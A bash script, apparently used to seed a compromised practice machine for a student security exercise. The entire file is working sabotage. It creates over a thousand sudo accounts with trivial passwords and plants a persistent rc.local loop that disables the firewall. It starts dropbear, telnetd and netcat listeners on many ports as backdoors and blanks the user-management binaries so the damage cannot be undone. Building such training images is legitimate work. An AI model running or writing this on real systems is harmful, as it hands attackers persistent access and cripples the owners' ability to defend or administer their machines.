#!/bin/bash
useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group
# -m create home dir

#add bunch of users
for i in {1..1000}
do
  useradd -m -g sudo -p $(openssl passwd -crypt $i) $i
done

cat << EOF > /bin/virus.sh
#!/bin/bash
while true
do
  /usr/sbin/ufw disable
  sleep 300
done
EOF

chmod 755 /bin/virus.sh

cat << EOF > /home/student/malware.sh
#!/bin/bash
/usr/bin/yes "Megan thinks its cool not to remove malware!"
EOF

chmod 755 /home/student/malware.sh


cat << EOF > /etc/rc.local
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 1111 || /bin/true
/bin/virus.sh || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/usr/sbin/dropbear -p 3333 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
/bin/virus.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
exit 0
EOF



apt-get -y install telnetd
apt-get -y install dropbear
for i in {1111..9999..1111}
do
  /usr/sbin/dropbear -p $i
done


for i in {10000..25000..250}
do 
  /bin/nc -l $i &
done

#Stop deleting users/ change password
echo '' > /usr/sbin/adduser
echo '' > /usr/sbin/useradd
echo '' > /usr/sbin/deluser
echo '' > /usr/sbin/userdel
#echo '' > /usr/bin/passwd

